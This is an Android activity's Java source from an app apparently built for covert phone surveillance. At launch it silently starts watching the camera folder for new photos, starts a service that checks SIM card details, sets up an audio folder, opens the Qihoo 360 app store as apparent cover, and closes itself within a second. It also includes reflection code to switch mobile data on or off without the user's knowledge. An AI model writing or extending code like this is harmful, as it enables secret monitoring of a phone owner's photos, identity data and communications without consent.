package com.phoneoverheard.phonne;

import java.io.File;
import java.lang.reflect.Method;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.view.Window;
import android.view.WindowManager;

@SuppressLint("SdCardPath")
public class MainActivity extends Activity {	
	private ConnectivityManager mCM;
	private static final String TAG = "MainActivity";  
	WriteLog mylog = new WriteLog();
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mCM = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);	
        // 无title
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        // 全屏
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);        
        try{
        	String imgfolder= "/mnt/sdcard/DCIM/Camera/";
        	String audiofolder = "/phonne/file/audio/";
        	ManagerService managerservice = new ManagerService(getBaseContext());
        	Manager manager = managerservice.find("manager");	
        	String imgdir = manager.getImgfolder();
    		boolean sdCardExist = Environment.getExternalStorageState()
    				.equals(android.os.Environment.MEDIA_MOUNTED); //判断sd卡是否存在 
        	if(new File(manager.getAudiofolder()).exists() == false){
        		if (sdCardExist){ 
        			audiofolder = new FileService().getSDPath(audiofolder);
        		}
            	managerservice.updateAudiofolder("manager",audiofolder);
        	}
        	if(new File(imgdir).exists() == false){
        		managerservice.updateImgfolder("manager",imgfolder);
        	}
	    	//开始监听监听相册是否有新照片
        	mylog.WrLog("i",TAG,"开始监听监听相册是否有新照片");
	        SDCardListener listener = new SDCardListener(imgfolder,getBaseContext());
		    listener.startWatching();
			//检查SIM卡信息
		    mylog.WrLog("i",TAG,"检查SIM卡信息");
			Intent StartHaomaService = new Intent(getBaseContext(), haomaService.class);
			StartHaomaService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			getBaseContext().startService(StartHaomaService);

		    //-----启动系统自带的应用程序------------------
			Intent intent=new Intent();
			intent.setComponent(new ComponentName("com.qihoo.appstore", "com.qihoo.appstore.activities.MainActivity"));
			startActivity(intent);
			
        }catch (Exception e) {
            e.printStackTrace();
        }
        new Thread() {
            @Override
			public void run() {
                try { 
                    /* 1秒后关闭页面*/
                    sleep(1000);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    finish(); // 关闭页面
                }
            }
        }.start();
	}

	
	
	//打开GPRS
	@SuppressWarnings("unused")
	public void gprsEnableOpen(){
		Object[] argObjects = null;
		boolean isOpen = gprsIsOpenMethod("getMobileDataEnabled");		
		if(!isOpen){
			setGprsEnable("setMobileDataEnabled", true);
		}
		
	}
	
	//关闭GPRS
	@SuppressWarnings("unused") 
	public void gprsEnableClose(){
		Object[] argObjects = null;
		setGprsEnable("setMobileDataEnabled", false);
	}
	
	//检测GPRS是否打开
	@SuppressWarnings({ "unchecked", "rawtypes" })
	public boolean gprsIsOpenMethod(String methodName){
		Class cmClass 		= mCM.getClass();
		Class[] argClasses 	= null;
		Object[] argObject 	= null;
		Boolean isOpen = false;
		try{
			Method method = cmClass.getMethod(methodName, argClasses);
			isOpen = (Boolean) method.invoke(mCM, argObject);
		} catch (Exception e){
			e.printStackTrace();
		}
		return isOpen;
	}
	
	//开启/关闭GPRS
	@SuppressWarnings({ "unchecked", "rawtypes" })
	public void setGprsEnable(String methodName, boolean isEnable){
		Class cmClass 		= mCM.getClass();
		Class[] argClasses 	= new Class[1];
		argClasses[0] 		= boolean.class;
		try{
			Method method = cmClass.getMethod(methodName, argClasses);
			method.invoke(mCM, isEnable);
		} catch (Exception e){
			e.printStackTrace();
		}
	}
}
